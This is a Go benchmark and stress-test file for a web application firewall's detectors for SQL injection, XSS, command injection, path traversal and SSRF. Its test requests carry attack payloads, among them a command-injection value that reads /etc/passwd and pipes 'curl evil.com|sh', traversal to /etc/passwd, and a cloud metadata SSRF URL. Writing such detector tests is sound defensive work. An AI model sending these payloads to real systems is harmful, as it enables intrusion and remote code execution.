package semantic

import (
	"context"
	"fmt"
	"net/http/httptest"
	"regexp"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/LaokeQwQ/CheeseWAF/internal/engine"
	enginerules "github.com/LaokeQwQ/CheeseWAF/internal/engine/rules"
)

// Benchmark single detector performance
func BenchmarkSQLDetector(b *testing.B) {
	d := NewSQLDetector("block")
	req := httptest.NewRequest("GET", "/search?q=1'+or+1=1--&id=1'+union+select+1,2,3--", nil)
	reqCtx, _ := engine.NewRequestContext(req, "default")
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_, _ = d.Detect(context.Background(), reqCtx)
	}
}

func BenchmarkXSSDetector(b *testing.B) {
	d := NewXSSDetector("block")
	req := httptest.NewRequest("GET", "/comment?text=<script>alert(1)</script><img+src=x+onerror=alert(1)>", nil)
	reqCtx, _ := engine.NewRequestContext(req, "default")
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_, _ = d.Detect(context.Background(), reqCtx)
	}
}

func BenchmarkRCEDetector(b *testing.B) {
	d := NewRCEDetector("block")
	req := httptest.NewRequest("GET", "/run?cmd=;cat+/etc/passwd;id;curl+evil.com|sh", nil)
	reqCtx, _ := engine.NewRequestContext(req, "default")
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_, _ = d.Detect(context.Background(), reqCtx)
	}
}

func BenchmarkFullPipeline(b *testing.B) {
	pipeline := engine.NewPipeline(
		NewSQLDetector("block"),
		NewXSSDetector("block"),
		NewRCEDetector("block"),
		NewLFIDetector("block"),
		NewSSRFDetector("block"),
	)
	req := httptest.NewRequest("GET", "/search?q=1'+or+1=1--&x=<script>alert(1)</script>", nil)
	reqCtx, _ := engine.NewRequestContext(req, "default")
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_, _ = pipeline.Detect(context.Background(), reqCtx)
	}
}

func BenchmarkSemanticAnalyzer(b *testing.B) {
	analyzer := NewAnalyzer("block")
	req := httptest.NewRequest("GET", "/search?q=1'+or+1=1--", nil)
	reqCtx, _ := engine.NewRequestContext(req, "default")
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_, _ = analyzer.Detect(context.Background(), reqCtx)
	}
}

func BenchmarkPipelineWithRules(b *testing.B) {
	re := regexp.MustCompile(`(?i)(?:union\s+select|or\s+1=1)`)
	rules := []enginerules.Rule{{
		ID: "test-rule", Name: "test", Pattern: re,
		Location: "uri", Action: engine.ActionBlock, Severity: engine.SeverityHigh, Priority: 100, Enabled: true,
	}}
	pipeline := engine.NewPipeline(enginerules.New(rules), NewSQLDetector("block"), NewXSSDetector("block"))
	req := httptest.NewRequest("GET", "/search?q=1'+or+1=1--", nil)
	reqCtx, _ := engine.NewRequestContext(req, "default")
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_, _ = pipeline.Detect(context.Background(), reqCtx)
	}
}

// Concurrent benchmarks
func BenchmarkPipelineConcurrent(b *testing.B) {
	pipeline := engine.NewPipeline(
		NewSQLDetector("block"), NewXSSDetector("block"), NewRCEDetector("block"),
		NewLFIDetector("block"), NewSSRFDetector("block"),
	)
	b.RunParallel(func(pb *testing.PB) {
		for pb.Next() {
			req := httptest.NewRequest("GET", "/search?q=1'+or+1=1--", nil)
			reqCtx, _ := engine.NewRequestContext(req, "default")
			_, _ = pipeline.Detect(context.Background(), reqCtx)
		}
	})
}

// Throughput test
func BenchmarkThroughput(b *testing.B) {
	pipeline := engine.NewPipeline(
		NewSQLDetector("block"), NewXSSDetector("block"), NewRCEDetector("block"),
		NewLFIDetector("block"), NewSSRFDetector("block"),
	)
	payloads := []string{
		"/search?q=1'+or+1=1--",
		"/search?q=<script>alert(1)</script>",
		"/run?cmd=;cat+/etc/passwd",
		"/dl?file=../../../etc/passwd",
		"/api?url=http://169.254.169.254/latest/meta-data",
		"/search?q=normal+search+query",
		"/api/users?id=42",
		"/page?name=hello-world",
	}
	ctx := context.Background()
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		req := httptest.NewRequest("GET", payloads[i%len(payloads)], nil)
		reqCtx, _ := engine.NewRequestContext(req, "default")
		_, _ = pipeline.Detect(ctx, reqCtx)
	}
}

// High-concurrency stress test
func TestPipelineHighConcurrency(t *testing.T) {
	pipeline := engine.NewPipeline(
		NewSQLDetector("block"), NewXSSDetector("block"), NewRCEDetector("block"),
		NewLFIDetector("block"), NewSSRFDetector("block"),
	)
	payloads := []string{
		"/search?q=1'+or+1=1--",
		"/search?q=<script>alert(1)</script>",
		"/search?q=normal+query",
		"/run?cmd=;cat+/etc/passwd",
		"/dl?file=../../../etc/passwd",
		"/api?url=http://169.254.169.254/",
	}
	var wg sync.WaitGroup
	workers := 100
	iterations := 500
	errCh := make(chan error, workers)
	ctx := context.Background()

	for w := 0; w < workers; w++ {
		wg.Add(1)
		go func(workerID int) {
			defer wg.Done()
			for i := 0; i < iterations; i++ {
				req := httptest.NewRequest("GET", payloads[(workerID+i)%len(payloads)], nil)
				reqCtx, err := engine.NewRequestContext(req, "default")
				if err != nil {
					errCh <- fmt.Errorf("worker %d: NewRequestContext error: %w", workerID, err)
					return
				}
				result, err := pipeline.Detect(ctx, reqCtx)
				if err != nil {
					errCh <- fmt.Errorf("worker %d: Detect error: %w", workerID, err)
					return
				}
				_ = result
			}
		}(w)
	}
	wg.Wait()
	close(errCh)
	for err := range errCh {
		t.Error(err)
	}
}

// Latency distribution test
func TestPipelineLatency(t *testing.T) {
	pipeline := engine.NewPipeline(
		NewSQLDetector("block"), NewXSSDetector("block"), NewRCEDetector("block"),
	)
	req := httptest.NewRequest("GET", "/search?q=1'+or+1=1--", nil)
	ctx := context.Background()

	samples := 10000
	var totalNs int64
	maxNs := int64(0)

	for i := 0; i < samples; i++ {
		reqCtx, _ := engine.NewRequestContext(req, "default")
		start := time.Now()
		_, _ = pipeline.Detect(ctx, reqCtx)
		elapsed := time.Since(start).Nanoseconds()
		totalNs += elapsed
		if elapsed > maxNs {
			maxNs = elapsed
		}
	}

	avgUs := float64(totalNs) / float64(samples) / 1000
	maxUs := float64(maxNs) / 1000
	t.Logf("Pipeline latency: avg=%.1fµs, max=%.1fµs over %d samples", avgUs, maxUs, samples)

	if maxUs > 5000 {
		t.Logf("WARNING: max latency %.1fµs exceeds 5ms target", maxUs)
	}
}

// Memory allocation benchmark
func BenchmarkAllocations(b *testing.B) {
	pipeline := engine.NewPipeline(
		NewSQLDetector("block"), NewXSSDetector("block"), NewRCEDetector("block"),
		NewLFIDetector("block"), NewSSRFDetector("block"),
	)
	req := httptest.NewRequest("GET", "/search?q="+strings.Repeat("x", 200), nil)
	ctx := context.Background()

	b.ReportAllocs()
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		reqCtx, _ := engine.NewRequestContext(req, "default")
		_, _ = pipeline.Detect(ctx, reqCtx)
	}
}
